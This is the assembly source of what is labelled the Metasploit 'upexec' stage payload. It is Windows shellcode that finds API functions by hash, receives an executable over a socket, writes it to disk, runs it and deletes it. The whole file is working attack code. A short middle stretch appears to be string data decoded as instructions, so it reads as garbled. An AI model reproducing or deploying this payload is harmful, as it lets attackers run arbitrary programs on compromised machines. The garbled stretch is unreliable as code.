;
; Metasploit Framework
; http://www.metasploit.com
;
; Source for upexec (stage)
;
; Authors: vlad902 <vlad902@gmail.com>
; Size   : 396
;

sub esp,0x40
cld
mov ebx,edi
call 0x56
pusha
mov ebp,[esp+0x24]
mov eax,[ebp+0x3c]
mov edi,[ebp+eax+0x78]
add edi,ebp
mov ecx,[edi+0x18]
mov ebx,[edi+0x20]
add ebx,ebp
dec ecx
mov esi,[ebx+ecx*4]
add esi,ebp
xor eax,eax
cdq
lodsb
test al,al
jz 0x39
ror edx,0xd
add edx,eax
jmp short 0x2d
cmp edx,[esp+0x28]
jnz 0x24
mov ebx,[edi+0x24]
add ebx,ebp
mov cx,[ebx+ecx*2]
mov ebx,[edi+0x1c]
add ebx,ebp
add ebp,[ebx+ecx*4]
mov [esp+0x1c],ebp
popa
ret
mov eax,[fs:0x30]
mov eax,[eax+0xc]
mov esi,[eax+0x1c]
lodsd
mov eax,[eax+0x8]
push eax
mov esi,esp
push dword 0xec0e4e8e
push dword [esi]
call near [esi+0x4]
push word 0x0
push word 0x3233
push dword 0x5f327377
mov ebp,esp
push ebp
call eax
mov [esi+0x8],eax
push dword 0xe71819b6
push dword [esi+0x8]
call near [esi+0x4]
mov [esi+0xc],eax
push byte +0x0
push byte +0x4
push ebp
push ebx
call near [esi+0xc]
mov edi,[ebp+0x0]
call 0xb2
inc ebx
cmp bl,[esp+esi*2+0x6d]
jo 0xdc
gs js 0x116
add [eax-0x77],bl
inc esi
adc [eax-0x5b],ch
pop ss
add [edi+edi*8+0x36],bh
call near [esi+0x4]
push byte +0x0
push byte +0x6
push byte +0x4
push byte +0x0
push byte +0x7
push dword 0xe0000000
push dword [esi+0x10]
call eax
mov [esi+0x14],eax
sub esp,0x804
mov ebp,esp
push dword 0xe80a791f
push dword [esi]
call near [esi+0x4]
mov [esi+0x18],eax
push byte +0x0
push dword 0x800
push ebp
push ebx
call near [esi+0xc]
sub edi,eax
push eax
mov ecx,esp
push byte +0x0
push ecx
push eax
push ebp
push dword [esi+0x14]
call near [esi+0x18]
pop eax
test edi,edi
jnz 0xec
push dword 0xffd97fb
push dword [esi]
call near [esi+0x4]
push dword [esi+0x14]
call eax
push byte +0x50
pop ecx
sub esp,ecx
mov edi,esp
push byte +0x44
mov edx,esp
xor eax,eax
rep stosb
inc byte [edx+0x2d]
inc byte [edx+0x2c]
xchg eax,ebx
lea edi,[edx+0x38]
stosd
stosd
stosd
push dword 0x16b3fe72
push dword [esi]
call near [esi+0x4]
push edi
push edx
push ecx
push ecx
push ecx
push byte +0x1
push ecx
push ecx
push dword [esi+0x10]
push ecx
call eax
push dword 0xce05d9ad
push dword [esi]
call near [esi+0x4]
push byte -0x1
push dword [edi]
call eax
push dword 0xc2ffb025
push dword [esi]
call near [esi+0x4]
push dword [esi+0x10]
call eax
push dword 0x79c679e7
push dword [esi+0x8]
call near [esi+0x4]
push dword [edi-0x4]
call eax
push dword 0x5f048af0
push dword [esi]
call near [esi+0x4]
call eax
